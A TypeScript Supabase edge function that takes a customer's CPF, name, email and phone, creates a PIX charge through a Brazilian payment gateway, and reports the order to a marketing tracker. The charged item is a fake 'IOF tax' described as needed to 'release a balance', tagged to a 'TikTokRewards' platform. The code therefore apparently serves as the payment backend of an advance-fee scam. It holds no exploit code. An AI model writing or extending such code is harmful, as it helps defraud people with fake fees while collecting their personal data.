import { serve } from "https://deno.land/std@0.168.0/http/server.ts";

const corsHeaders = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

serve(async (req) => {
  if (req.method === 'OPTIONS') {
    return new Response(null, { headers: corsHeaders });
  }

  try {
    const { amount, customerCpf, customerName, customerEmail, customerPhone } = await req.json();

    const PAYZOR_SECRET_KEY = Deno.env.get('PAYZOR_SECRET_KEY');
    const PAYZOR_PUBLIC_KEY = Deno.env.get('PAYZOR_PUBLIC_KEY');

    if (!PAYZOR_SECRET_KEY || !PAYZOR_PUBLIC_KEY) {
      throw new Error('Payzor API keys not configured');
    }

    const credentials = btoa(`${PAYZOR_SECRET_KEY}:${PAYZOR_PUBLIC_KEY}`);

    const response = await fetch('https://api.payzor.com.br/api/v1/transactions', {
      method: 'POST',
      headers: {
        'Authorization': `Basic ${credentials}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        amount,
        paymentMethod: 'PIX',
        postbackUrl: `${Deno.env.get('SUPABASE_URL')}/functions/v1/payment-webhook`,
        externalRef: `ORDER-${Date.now()}`,
        customer: {
          ip: '0.0.0.0',
          name: customerName,
          email: customerEmail,
          phone: customerPhone,
          document: {
            type: 'CPF',
            number: customerCpf,
          },
        },
        items: [
          {
            title: 'Imposto IOF',
            description: 'Pagamento de IOF para liberação de saldo',
            unitPrice: amount,
            quantity: 1,
          },
        ],
        pix: {
          expiresInDays: 1,
        },
      }),
    });

    const data = await response.json();

    if (!response.ok) {
      throw new Error(`Payzor API error: ${JSON.stringify(data)}`);
    }

    // Send to Utmify as waiting_payment
    const UTMIFY_API_TOKEN = Deno.env.get('UTMIFY_API_TOKEN');
    if (UTMIFY_API_TOKEN) {
      const now = new Date();
      const createdAt = now.toISOString().replace('T', ' ').slice(0, 19);

      await fetch('https://api.utmify.com.br/api-credentials/orders', {
        method: 'POST',
        headers: {
          'x-api-token': UTMIFY_API_TOKEN,
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          orderId: data.id,
          platform: 'TikTokRewards',
          paymentMethod: 'pix',
          status: 'waiting_payment',
          createdAt,
          approvedDate: null,
          refundedAt: null,
          customer: {
            name: customerName,
            email: customerEmail,
            phone: customerPhone,
            document: customerCpf,
            country: 'BR',
          },
          products: [
            {
              id: 'iof-tax',
              name: 'Imposto IOF',
              planId: null,
              planName: null,
              quantity: 1,
              priceInCents: amount,
            },
          ],
          trackingParameters: {
            src: null,
            sck: null,
            utm_source: null,
            utm_campaign: null,
            utm_medium: null,
            utm_content: null,
            utm_term: null,
          },
          commission: {
            totalPriceInCents: amount,
            gatewayFeeInCents: 0,
            userCommissionInCents: amount,
          },
        }),
      });
    }

    return new Response(JSON.stringify(data), {
      status: 200,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  } catch (error: unknown) {
    console.error('Error creating payment:', error);
    const errorMessage = error instanceof Error ? error.message : 'Unknown error';
    return new Response(JSON.stringify({ error: errorMessage }), {
      status: 500,
      headers: { ...corsHeaders, 'Content-Type': 'application/json' },
    });
  }
});
